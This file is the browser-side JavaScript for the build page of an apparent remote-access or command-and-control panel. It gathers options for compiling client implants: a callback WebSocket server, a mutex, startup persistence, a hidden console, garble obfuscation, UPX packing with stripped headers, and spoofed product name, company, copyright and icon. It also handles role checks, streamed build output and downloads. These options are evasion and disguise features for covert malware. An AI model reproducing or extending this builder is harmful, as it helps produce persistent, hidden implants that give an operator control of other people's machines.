const form = document.getElementById("build-form");
const buildBtn = document.getElementById("build-btn");
const buildStatus = document.getElementById("build-status");
const buildStatusText = document.getElementById("build-status-text");
const buildOutputDiv = document.getElementById("build-output");
const buildOutputContainer = document.getElementById("build-output-container");
const buildResults = document.getElementById("build-results");
const buildFilesDiv = document.getElementById("build-files");
const logoutBtn = document.getElementById("logout-btn");
const usernameDisplay = document.getElementById("username-display");
const roleBadge = document.getElementById("role-badge");
const usersLink = document.getElementById("users-link");
const buildLink = document.getElementById("build-link");
const scriptsLink = document.getElementById("scripts-link");
const pluginsLink = document.getElementById("plugins-link");
const rawServerListCheckbox = document.getElementById("raw-server-list");
const serverUrlInput = document.getElementById("server-url");

let currentServerVersion = null;

async function loadServerVersion() {
  try {
    const res = await fetch("/api/version", { credentials: "include" });
    if (!res.ok) {
      currentServerVersion = null;
      return;
    }
    const payload = await res.json();
    const version = typeof payload?.version === "string" ? payload.version.trim() : "";
    currentServerVersion = version || null;
  } catch {
    currentServerVersion = null;
  }
}

function getDefaultServerUrlPlaceholder(isRawList) {
  const isHttps = window.location.protocol === "https:";
  const host = window.location.host;
  if (isRawList) {
    return `${isHttps ? "https" : "http"}://${host}/list.txt`;
  }
  return `${isHttps ? "wss" : "ws"}://${host}`;
}

function updateServerUrlPlaceholder() {
  if (!serverUrlInput) return;
  const isRaw = rawServerListCheckbox?.checked ?? false;
  const placeholder = getDefaultServerUrlPlaceholder(isRaw);
  serverUrlInput.placeholder = placeholder;
  if (!serverUrlInput.value.trim()) {
    serverUrlInput.value = placeholder;
  }
}

let isBuilding = false;

init();

if (rawServerListCheckbox && serverUrlInput) {
  rawServerListCheckbox.addEventListener("change", () => {
    const isRaw = rawServerListCheckbox.checked;
    const current = serverUrlInput.value.trim();

    if (isRaw) {
      if (current.startsWith("wss://")) {
        serverUrlInput.value = "https://" + current.slice("wss://".length);
      } else if (current.startsWith("ws://")) {
        serverUrlInput.value = "http://" + current.slice("ws://".length);
      }
      serverUrlInput.placeholder = getDefaultServerUrlPlaceholder(true);
    } else {
      if (current.startsWith("https://")) {
        serverUrlInput.value = "wss://" + current.slice("https://".length);
      } else if (current.startsWith("http://")) {
        serverUrlInput.value = "ws://" + current.slice("http://".length);
      }
      serverUrlInput.placeholder = getDefaultServerUrlPlaceholder(false);
    }
  });
}

const persistenceCheckbox = document.querySelector('input[name="enable-persistence"]');
const persistenceMethodContainer = document.getElementById("persistence-method-container");
if (persistenceCheckbox && persistenceMethodContainer) {
  persistenceCheckbox.addEventListener("change", () => {
    if (persistenceCheckbox.checked) {
      persistenceMethodContainer.classList.remove("hidden");
    } else {
      persistenceMethodContainer.classList.add("hidden");
    }
  });
}

const obfuscateCheckbox = document.querySelector('input[name="obfuscate"]');
const garbleSettingsContainer = document.getElementById("garble-settings-container");
if (obfuscateCheckbox && garbleSettingsContainer) {
  obfuscateCheckbox.addEventListener("change", () => {
    if (obfuscateCheckbox.checked) {
      garbleSettingsContainer.classList.remove("hidden");
    } else {
      garbleSettingsContainer.classList.add("hidden");
    }
  });
}

const upxCheckbox = document.querySelector('input[name="enable-upx"]');
const upxSettingsContainer = document.getElementById("upx-settings-container");
if (upxCheckbox && upxSettingsContainer) {
  upxCheckbox.addEventListener("change", () => {
    if (upxCheckbox.checked) {
      upxSettingsContainer.classList.remove("hidden");
    } else {
      upxSettingsContainer.classList.add("hidden");
    }
  });
}

let pendingIconBase64 = null;
const iconUpload = document.getElementById("icon-upload");
const iconLabel = document.getElementById("icon-label");
const iconClear = document.getElementById("icon-clear");

if (iconUpload) {
  iconUpload.addEventListener("change", () => {
    const file = iconUpload.files[0];
    if (!file) return;
    if (file.size > 1024 * 1024) {
      alert("Icon file must be under 1MB");
      iconUpload.value = "";
      return;
    }
    const reader = new FileReader();
    reader.onload = () => {
      const base64 = reader.result.split(",")[1];
      pendingIconBase64 = base64;
      if (iconLabel) iconLabel.textContent = file.name;
      if (iconClear) iconClear.classList.remove("hidden");
    };
    reader.readAsDataURL(file);
  });
}

if (iconClear) {
  iconClear.addEventListener("click", () => {
    pendingIconBase64 = null;
    if (iconUpload) iconUpload.value = "";
    if (iconLabel) iconLabel.textContent = "Choose .ico file";
    iconClear.classList.add("hidden");
  });
}

async function init() {
  try {
    updateServerUrlPlaceholder();
    const res = await fetch("/api/auth/me", {
      credentials: "include",
    });

    if (!res.ok) {
      window.location.href = "/login.html";
      return;
    }

    const data = await res.json();
    usernameDisplay.textContent = data.username;

    const roleBadges = {
      admin: '<i class="fa-solid fa-crown mr-1"></i>Admin',
      operator: '<i class="fa-solid fa-sliders mr-1"></i>Operator',
      viewer: '<i class="fa-solid fa-eye mr-1"></i>Viewer',
    };
    if (roleBadges[data.role]) {
      roleBadge.innerHTML = roleBadges[data.role];
    } else {
      roleBadge.textContent = data.role || "";
    }

    if (data.role === "admin") {
      roleBadge.classList.add(
        "bg-purple-900/50",
        "text-purple-300",
        "border",
        "border-purple-800",
      );
    } else if (data.role === "operator") {
      roleBadge.classList.add(
        "bg-blue-900/50",
        "text-blue-300",
        "border",
        "border-blue-800",
      );
    } else {
      roleBadge.classList.add(
        "bg-slate-700",
        "text-slate-300",
        "border",
        "border-slate-600",
      );
    }
    if (data.role === "admin") {
      usersLink.classList.remove("hidden");
      pluginsLink?.classList.remove("hidden");
      document.getElementById("deploy-link")?.classList.remove("hidden");
    }

    if (data.role === "admin" || data.role === "operator" || data.canBuild) {
      buildLink?.classList.remove("hidden");
    }

    if (data.role !== "viewer") {
      scriptsLink?.classList.remove("hidden");
    }

    if (data.role !== "admin" && data.role !== "operator" && !data.canBuild) {
      buildBtn.disabled = true;
      buildBtn.innerHTML =
        '<i class="fa-solid fa-lock"></i> <span>Build requires permission</span>';
    }

    await loadServerVersion();
    await loadSavedBuilds();
  } catch (err) {
    console.error("Failed to fetch user info:", err);
    window.location.href = "/login.html";
  }
}

if (logoutBtn && !logoutBtn.dataset.boundLogout) {
  logoutBtn.dataset.boundLogout = "true";
  logoutBtn.addEventListener("click", async () => {
    try {
      await fetch("/api/logout", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
      });
    } catch (err) {
      console.error("Logout error:", err);
    }
    window.location.href = "/";
  });
}

form?.addEventListener("submit", async (e) => {
  e.preventDefault();

  if (isBuilding) return;

  const platformCheckboxes = form.querySelectorAll(
    'input[name="platform"]:checked',
  );
  const platforms = Array.from(platformCheckboxes).map((cb) => cb.value);

  if (platforms.length === 0) {
    alert("Please select at least one platform to build");
    return;
  }

  const serverUrl = form.querySelector("#server-url").value.trim();
  const rawServerList = form.querySelector("#raw-server-list")?.checked || false;
  const mutex = form.querySelector("#mutex")?.value.trim() || "";
  const disableMutex = form.querySelector('input[name="disable-mutex"]')?.checked || false;
  const stripDebug = form.querySelector('input[name="strip-debug"]').checked;
  const disableCgo = form.querySelector('input[name="disable-cgo"]').checked;
  const obfuscate = form.querySelector('input[name="obfuscate"]').checked;
  const enablePersistence = form.querySelector(
    'input[name="enable-persistence"]',
  ).checked;
  const persistenceMethod = form.querySelector('#persistence-method')?.value || 'startup';
  const hideConsole = form.querySelector(
    'input[name="hide-console"]',
  ).checked;
  const noPrinting = form.querySelector(
    'input[name="no-printing"]',
  ).checked;

  const outputNameVal = form.querySelector("#output-name")?.value.trim() || "";
  const garbleLiterals = form.querySelector('input[name="garble-literals"]')?.checked || false;
  const garbleTiny = form.querySelector('input[name="garble-tiny"]')?.checked || false;
  const garbleSeedVal = form.querySelector("#garble-seed")?.value.trim() || "";
  const assemblyTitle = form.querySelector("#assembly-title")?.value.trim() || "";
  const assemblyProduct = form.querySelector("#assembly-product")?.value.trim() || "";
  const assemblyCompany = form.querySelector("#assembly-company")?.value.trim() || "";
  const assemblyVersion = form.querySelector("#assembly-version")?.value.trim() || "";
  const assemblyCopyright = form.querySelector("#assembly-copyright")?.value.trim() || "";

  const buildConfig = {
    platforms,
    serverUrl: serverUrl || undefined,
    rawServerList,
    mutex: disableMutex ? "" : mutex || undefined,
    disableMutex,
    stripDebug,
    disableCgo,
    obfuscate,
    enablePersistence,
    persistenceMethod: enablePersistence ? persistenceMethod : undefined,
    hideConsole,
    noPrinting,
    outputName: outputNameVal || undefined,
    garbleLiterals: obfuscate ? garbleLiterals : undefined,
    garbleTiny: obfuscate ? garbleTiny : undefined,
    garbleSeed: obfuscate && garbleSeedVal ? garbleSeedVal : undefined,
    assemblyTitle: assemblyTitle || undefined,
    assemblyProduct: assemblyProduct || undefined,
    assemblyCompany: assemblyCompany || undefined,
    assemblyVersion: assemblyVersion || undefined,
    assemblyCopyright: assemblyCopyright || undefined,
    iconBase64: pendingIconBase64 || undefined,
    enableUpx: form.querySelector('input[name="enable-upx"]')?.checked || false,
    upxStripHeaders: form.querySelector('input[name="upx-strip-headers"]')?.checked || false,
  };

  const hasAndroid = platforms.some(p => p.startsWith('android-'));
  const hasBsd = platforms.some(
    p => p.startsWith('freebsd-') || p.startsWith('openbsd-'),
  );

  if (hasAndroid || hasBsd) {
    let warningText = 'WARNING: Some selected targets are severely untested and will probably not work right.\n\n';

    if (hasAndroid) {
      warningText += '- Android targets are severely untested and will probably not work right.\n';
    }

    if (hasBsd) {
      warningText += '- BSD targets are severely untested and will probably not work right.\n';
    }

    warningText += '\nContinue with build anyway?';

    if (!confirm(warningText)) {
      return;
    }
  }

  if (hasAndroid && enablePersistence) {
    if (!confirm(
      '⚠️ WARNING: Persistence is NOT supported on Android\n\n' +
      'The persistence setting will be ignored for Android builds.\n' +
      'Persistence is only supported on: Windows, Linux, and macOS\n\n' +
      'Continue with build anyway?'
    )) {
      return;
    }
  }

  await startBuild(buildConfig);
});

async function startBuild(config) {
  isBuilding = true;
  buildBtn.disabled = true;
  buildBtn.innerHTML =
    '<i class="fa-solid fa-spinner fa-spin"></i> <span>Building...</span>';

  buildStatus.classList.remove("hidden");
  buildStatusText.textContent = "Starting build...";
  buildResults.classList.add("hidden");
  buildFilesDiv.innerHTML = "";

  buildOutputDiv.innerHTML = "";
  addBuildOutput("Starting build process...\n", "info");

  try {
    const res = await fetch("/api/build/start", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      credentials: "include",
      body: JSON.stringify(config),
    });

    if (!res.ok) {
      const error = await res.json();
      throw new Error(error.error || "Build failed to start");
    }

    const data = await res.json();
    const buildId = data.buildId;

    addBuildOutput(`Build ID: ${buildId}\n`, "info");
    addBuildOutput(
      `Building for platforms: ${config.platforms.join(", ")}\n\n`,
      "info",
    );

    await streamBuildOutput(buildId, config);
  } catch (err) {
    addBuildOutput(`\nERROR: ${err.message}\n`, "error");
    if (!config.disableCgo) {
      addBuildOutput(
        "Hint: This build used CGO. If it keeps failing, try enabling the 'Disable CGO' option and build again.\n",
        "warn",
      );
    }
    buildStatusText.textContent = "Build failed";
    buildStatus.querySelector("div").className =
      "flex items-center gap-2 p-3 rounded-lg bg-red-900/40 border border-red-700/60";
    buildStatus.querySelector("i").className = "fa-solid fa-circle-xmark";
  } finally {
    isBuilding = false;
    buildBtn.disabled = false;
    buildBtn.innerHTML =
      '<i class="fa-solid fa-hammer"></i> <span>Start Build</span>';
  }
}

async function streamBuildOutput(buildId, config = {}) {
  const res = await fetch(`/api/build/${buildId}/stream`, {
    credentials: "include",
  });

  if (!res.ok) {
    throw new Error("Failed to connect to build stream");
  }

  const reader = res.body.getReader();
  const decoder = new TextDecoder();
  let buffer = "";

  try {
    while (true) {
      const { done, value } = await reader.read();

      if (done) break;

      buffer += decoder.decode(value, { stream: true });

      const lines = buffer.split("\n");
      buffer = lines.pop();

      for (const line of lines) {
        if (!line.trim()) continue;

        if (line.startsWith("data: ")) {
          const data = JSON.parse(line.substring(6));

          if (data.type === "output") {
            addBuildOutput(data.text, data.level || "info");
          } else if (data.type === "status") {
            buildStatusText.textContent = data.text;
          } else if (data.type === "complete") {
            buildStatusText.textContent = data.success
              ? "Build completed successfully!"
              : "Build failed";
            buildStatus.querySelector("div").className = data.success
              ? "flex items-center gap-2 p-3 rounded-lg bg-green-900/40 border border-green-700/60"
              : "flex items-center gap-2 p-3 rounded-lg bg-red-900/40 border border-red-700/60";
            buildStatus.querySelector("i").className = data.success
              ? "fa-solid fa-circle-check"
              : "fa-solid fa-circle-xmark";

            if (!data.success && !config.disableCgo) {
              addBuildOutput(
                "Hint: This build used CGO. If it keeps failing, try enabling the 'Disable CGO' option and build again.\n",
                "warn",
              );
            }

            if (data.success && data.files) {
              const buildData = {
                id: data.buildId,
                status: "success",
                startTime: Date.now(),
                expiresAt: data.expiresAt,
                files: data.files,
              };
              saveBuildToStorage(data.buildId, buildData);

              buildResults.classList.remove("hidden");
              displayBuild(buildData);
            }

            reader.releaseLock();
            return;
          } else if (data.type === "error") {
            addBuildOutput(`\nERROR: ${data.error}\n`, "error");
          }
        }
      }

      buildOutputContainer.scrollTop = buildOutputContainer.scrollHeight;
    }
  } finally {
    reader.releaseLock();
  }
}

function addBuildOutput(text, level = "info") {
  const span = document.createElement("span");
  span.textContent = text;

  if (level === "error") {
    span.className = "text-red-400";
  } else if (level === "success") {
    span.className = "text-green-400";
  } else if (level === "warn") {
    span.className = "text-yellow-400";
  } else {
    span.className = "text-slate-300";
  }

  buildOutputDiv.appendChild(span);
}

function showBuildFiles(files, buildId, expiresAt) {
  buildResults.classList.remove("hidden");
  buildFilesDiv.innerHTML = "";

  const buildInfoDiv = document.createElement("div");
  buildInfoDiv.className =
    "mb-3 p-3 bg-slate-900/70 border border-slate-700 rounded-lg";
  const infoRow = document.createElement("div");
  infoRow.className = "flex items-center justify-between gap-2 text-sm";
  const left = document.createElement("div");
  left.className = "flex items-center gap-2";
  const idIcon = document.createElement("i");
  idIcon.className = "fa-solid fa-fingerprint text-slate-400";
  const idLabel = document.createElement("span");
  idLabel.className = "text-slate-300";
  idLabel.textContent = "Build ID:";
  const idCode = document.createElement("code");
  idCode.className = "text-blue-400 font-mono";
  idCode.textContent = buildId;
  left.appendChild(idIcon);
  left.appendChild(idLabel);
  left.appendChild(idCode);

  const right = document.createElement("div");
  right.className = "flex items-center gap-2";
  const clockIcon = document.createElement("i");
  clockIcon.className = "fa-solid fa-clock text-slate-400";
  const expiresLabel = document.createElement("span");
  expiresLabel.className = "text-slate-300";
  expiresLabel.textContent = "Expires in:";
  const timer = document.createElement("span");
  timer.id = "expiration-timer";
  timer.className = "text-yellow-400 font-medium";
  timer.dataset.expires = String(expiresAt);
  timer.textContent = "Calculating...";
  right.appendChild(clockIcon);
  right.appendChild(expiresLabel);
  right.appendChild(timer);

  infoRow.appendChild(left);
  infoRow.appendChild(right);
  buildInfoDiv.appendChild(infoRow);
  buildFilesDiv.appendChild(buildInfoDiv);

  updateExpirationTimer();
  setInterval(updateExpirationTimer, 60000);

  files.forEach((file) => {
    const fileDiv = document.createElement("div");
    fileDiv.className =
      "flex items-center justify-between gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg";

    const fileInfo = document.createElement("div");
    fileInfo.className = "flex items-center gap-2";
    const fileIcon = document.createElement("i");
    fileIcon.className = "fa-solid fa-file-code text-blue-400";
    const fileName = document.createElement("span");
    fileName.className = "font-medium";
    fileName.textContent = file.name;
    const fileSize = document.createElement("span");
    fileSize.className = "text-xs text-slate-500";
    fileSize.textContent = formatFileSize(file.size);
    fileInfo.appendChild(fileIcon);
    fileInfo.appendChild(fileName);
    fileInfo.appendChild(fileSize);

    const downloadBtn = document.createElement("a");
    downloadBtn.href = `/api/build/download/${encodeURIComponent(file.name)}`;
    downloadBtn.className =
      "inline-flex items-center gap-1 px-3 py-1 rounded bg-blue-600 hover:bg-blue-700 text-white text-sm transition-colors";
    downloadBtn.innerHTML = '<i class="fa-solid fa-download"></i> Download';

    fileDiv.appendChild(fileInfo);
    fileDiv.appendChild(downloadBtn);
    buildFilesDiv.appendChild(fileDiv);
  });
}

function updateExpirationTimer(timerEl, expiresAt) {
  if (!timerEl) return;

  const now = Date.now();
  const remaining = expiresAt - now;

  if (remaining <= 0) {
    timerEl.textContent = "Expired";
    timerEl.className = "text-red-400 font-medium";
    return;
  }

  const days = Math.floor(remaining / (1000 * 60 * 60 * 24));
  const hours = Math.floor(
    (remaining % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60),
  );
  const minutes = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));

  if (days > 0) {
    timerEl.textContent = `${days}d ${hours}h`;
  } else if (hours > 0) {
    timerEl.textContent = `${hours}h ${minutes}m`;
  } else {
    timerEl.textContent = `${minutes}m`;
  }

  if (days >= 3) {
    timerEl.className = "text-green-400 font-medium";
  } else if (days >= 1) {
    timerEl.className = "text-yellow-400 font-medium";
  } else {
    timerEl.className = "text-orange-400 font-medium";
  }
}

async function deleteBuild(buildId) {
  if (!confirm("Are you sure you want to delete this build?")) {
    return;
  }

  try {
    const res = await fetch(`/api/build/${encodeURIComponent(buildId)}/delete`, {
      method: "DELETE",
      credentials: "include",
    });

    if (!res.ok) {
      const data = await res.json().catch(() => ({}));
      throw new Error(data.error || "Failed to delete build");
    }

    const buildElement = document.getElementById(`build-${buildId}`);
    if (buildElement) {
      buildElement.remove();
    }

    removeBuildFromStorage(buildId);

    if (buildFilesDiv.children.length === 0) {
      buildResults.classList.add("hidden");
    }
  } catch (err) {
    console.error("Failed to delete build:", err);
    alert("Failed to delete build. Please try again.");
  }
}

function formatFileSize(bytes) {
  if (bytes === 0) return "0 B";
  const k = 1024;
  const sizes = ["B", "KB", "MB", "GB"];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return Math.round((bytes / Math.pow(k, i)) * 100) / 100 + " " + sizes[i];
}

function formatStubVersion(version) {
  if (typeof version === "string" && version.trim()) {
    return version.trim();
  }
  return "unknown (legacy build)";
}

function isVersionMismatch(versionValue) {
  if (!currentServerVersion) return false;
  return versionValue !== currentServerVersion;
}

function saveBuildToStorage(buildId, buildData) {
  try {
    const builds = JSON.parse(localStorage.getItem("overlord_builds") || "[]");
    const existingIndex = builds.findIndex((b) => b.id === buildId);

    if (existingIndex >= 0) {
      builds[existingIndex] = buildData;
    } else {
      builds.push(buildData);
    }

    if (builds.length > 20) {
      builds.splice(0, builds.length - 20);
    }

    localStorage.setItem("overlord_builds", JSON.stringify(builds));
  } catch (err) {
    console.error("Failed to save build to localStorage:", err);
  }
}

function getBuildFromStorage(buildId) {
  try {
    const builds = JSON.parse(localStorage.getItem("overlord_builds") || "[]");
    return builds.find((b) => b.id === buildId);
  } catch (err) {
    console.error("Failed to get build from localStorage:", err);
    return null;
  }
}

function getAllBuildsFromStorage() {
  try {
    const builds = JSON.parse(localStorage.getItem("overlord_builds") || "[]");

    return builds.sort((a, b) => b.startTime - a.startTime);
  } catch (err) {
    console.error("Failed to get builds from localStorage:", err);
    return [];
  }
}

function removeBuildFromStorage(buildId) {
  try {
    const builds = JSON.parse(localStorage.getItem("overlord_builds") || "[]");
    const filtered = builds.filter((b) => b.id !== buildId);
    localStorage.setItem("overlord_builds", JSON.stringify(filtered));
  } catch (err) {
    console.error("Failed to remove build from localStorage:", err);
  }
}

async function loadSavedBuilds() {
  try {
    const res = await fetch("/api/build/list", {
      credentials: "include",
    });

    if (!res.ok) {
      console.error("Failed to fetch builds from server");
      return;
    }

    const data = await res.json();
    const builds = data.builds || [];

    const now = Date.now();
    const validBuilds = builds.filter((build) => {
      if (build.expiresAt && build.expiresAt <= now) {
        return false;
      }
      return true;
    });

    if (validBuilds.length === 0) {
      return;
    }

    buildResults.classList.remove("hidden");

    for (const build of validBuilds) {
      displayBuild(build);

      saveBuildToStorage(build.id, build);
    }
  } catch (err) {
    console.error("Failed to load builds:", err);

    const builds = getAllBuildsFromStorage();
    const now = Date.now();
    const validBuilds = builds.filter((build) => {
      if (build.expiresAt && build.expiresAt <= now) {
        removeBuildFromStorage(build.id);
        return false;
      }
      return true;
    });

    if (validBuilds.length > 0) {
      buildResults.classList.remove("hidden");
      validBuilds.forEach((build) => displayBuild(build));
    }
  }
}

function displayBuild(build) {
  const buildContainer = document.createElement("div");
  buildContainer.className =
    "build-result-item mb-6 pb-6 border-b border-gray-700 last:border-b-0";
  buildContainer.id = `build-${build.id}`;
  const header = document.createElement("div");
  header.className = "flex items-center justify-between mb-3";

  const left = document.createElement("div");
  left.className = "flex items-center gap-3";
  const boxIcon = document.createElement("i");
  boxIcon.className = "fa-solid fa-box text-blue-400";
  const buildLabel = document.createElement("span");
  buildLabel.className = "text-gray-300 font-medium";
  buildLabel.textContent = `Build ID: ${build.id.substring(0, 8)}`;
  const sep = document.createElement("span");
  sep.className = "text-gray-500";
  sep.textContent = "•";
  const startedAt = document.createElement("span");
  startedAt.className = "text-sm text-gray-400";
  startedAt.textContent = new Date(build.startTime).toLocaleString();
  left.appendChild(boxIcon);
  left.appendChild(buildLabel);
  left.appendChild(sep);
  left.appendChild(startedAt);

  const right = document.createElement("div");
  right.className = "flex items-center gap-3";
  const timerWrap = document.createElement("div");
  timerWrap.className = "flex items-center gap-2";
  const clockIcon = document.createElement("i");
  clockIcon.className = "fa-solid fa-clock text-gray-400";
  const timer = document.createElement("span");
  timer.id = `timer-${build.id}`;
  timer.className = "text-gray-300 font-medium";
  timer.textContent = "Loading...";
  timerWrap.appendChild(clockIcon);
  timerWrap.appendChild(timer);

  const deleteBtn = document.createElement("button");
  deleteBtn.id = `delete-btn-${build.id}`;
  deleteBtn.className =
    "px-3 py-1.5 bg-red-500/20 hover:bg-red-500/30 text-red-400 rounded-lg transition-colors flex items-center gap-2 text-sm";
  deleteBtn.title = "Delete build";
  const deleteIcon = document.createElement("i");
  deleteIcon.className = "fa-solid fa-trash";
  const deleteText = document.createElement("span");
  deleteText.textContent = "Delete";
  deleteBtn.appendChild(deleteIcon);
  deleteBtn.appendChild(deleteText);
  deleteBtn.addEventListener("click", () => deleteBuild(build.id));

  right.appendChild(timerWrap);
  right.appendChild(deleteBtn);

  header.appendChild(left);
  header.appendChild(right);

  const filesContainer = document.createElement("div");
  filesContainer.id = `files-${build.id}`;
  filesContainer.className = "space-y-2";

  buildContainer.appendChild(header);
  buildContainer.appendChild(filesContainer);

  buildFilesDiv.appendChild(buildContainer);

  showBuildFilesForContainer(build, `files-${build.id}`, `timer-${build.id}`);
}

function showBuildFilesForContainer(build, containerId, timerId) {
  const container = document.getElementById(containerId);
  const timerEl = document.getElementById(timerId);

  if (!container || !timerEl) return;

  build.files.forEach((file) => {
    const fileDiv = document.createElement("div");
    fileDiv.className =
      "flex items-center justify-between bg-gray-700/50 p-4 rounded-lg hover:bg-gray-700 transition-colors";

    const fileMeta = document.createElement("div");
    fileMeta.className = "flex items-center gap-3";
    const fileIcon = document.createElement("i");
    fileIcon.className = "fa-solid fa-file text-blue-400";
    const fileText = document.createElement("div");
    const fileName = document.createElement("div");
    fileName.className = "text-white font-medium";
    fileName.textContent = file.filename;
    const filePlatform = document.createElement("div");
    filePlatform.className = "text-sm text-gray-400";
    const versionValue = formatStubVersion(file.version);
    const platformText = document.createElement("span");
    platformText.textContent = `${file.platform} | `;
    const versionText = document.createElement("span");
    versionText.className = isVersionMismatch(versionValue)
      ? "server-version-number-mismatch"
      : "server-version-number";
    versionText.textContent =
      versionValue === "unknown (legacy build)" ? versionValue : `v${versionValue}`;
    filePlatform.appendChild(platformText);
    filePlatform.appendChild(versionText);
    fileText.appendChild(fileName);
    fileText.appendChild(filePlatform);
    fileMeta.appendChild(fileIcon);
    fileMeta.appendChild(fileText);

    const download = document.createElement("a");
    download.href = `/api/build/download/${encodeURIComponent(file.filename)}`;
    download.download = "";
    download.className =
      "px-4 py-2 bg-blue-500 hover:bg-blue-600 text-white rounded-lg transition-colors flex items-center gap-2";
    const downloadIcon = document.createElement("i");
    downloadIcon.className = "fa-solid fa-download";
    const downloadText = document.createElement("span");
    downloadText.textContent = "Download";
    download.appendChild(downloadIcon);
    download.appendChild(downloadText);

    fileDiv.appendChild(fileMeta);
    fileDiv.appendChild(download);

    container.appendChild(fileDiv);
  });

  if (build.expiresAt) {
    updateExpirationTimer(timerEl, build.expiresAt);

    setInterval(() => updateExpirationTimer(timerEl, build.expiresAt), 60000);
  }
}
